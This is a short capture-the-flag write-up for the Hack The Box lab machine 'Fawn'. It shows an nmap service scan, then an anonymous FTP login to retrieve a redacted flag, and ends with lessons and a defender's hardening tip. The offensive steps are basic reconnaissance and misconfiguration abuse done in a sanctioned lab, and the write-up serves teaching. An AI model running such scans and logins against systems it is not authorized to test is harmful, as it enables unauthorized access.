# Fawn (Hack The Box, Starting Point)

| | |
|---|---|
| OS | Unix |
| Difficulty | Very Easy (Starting Point, Tier 0) |
| Date | 2026-09-28 |
| Key techniques | FTP anonymous login, nmap default scripts |

## Summary

The only open port was FTP (vsftpd 3.0.3) with anonymous login allowed, and the flag was sitting in the FTP root. nmap's default scripts showed both before I even logged in.

## Recon

```bash
nmap -sC -sV <target-ip>
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
| ftp-syst:
|   STAT:
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 3.0.3 - secure, fast, stable
Service Info: OS: Unix
```

The `ftp-anon` script already confirms anonymous login works and lists `flag.txt`.

## Foothold

FTP has a built-in guest account, `anonymous`, that needs no real password:

```bash
ftp <target-ip>
# Name: anonymous
# Password: (blank)
# 230 Login successful.
ftp> ls
ftp> get flag.txt
ftp> bye
cat flag.txt
```

Flag redacted.

## Lessons learned

- Run `-sC` together with `-sV`: the default scripts did half the work here.
- FTP response code `230` means login successful.
- When `-h` doesn't show a tool's help, try `-?` (that's what worked for the ftp client).
- FTP is plaintext, like telnet. SFTP (file transfer over SSH) is the secure replacement.
- **Defender view:** set `anonymous_enable=NO` in vsftpd unless public access is really needed, and never leave sensitive files in a public FTP root.
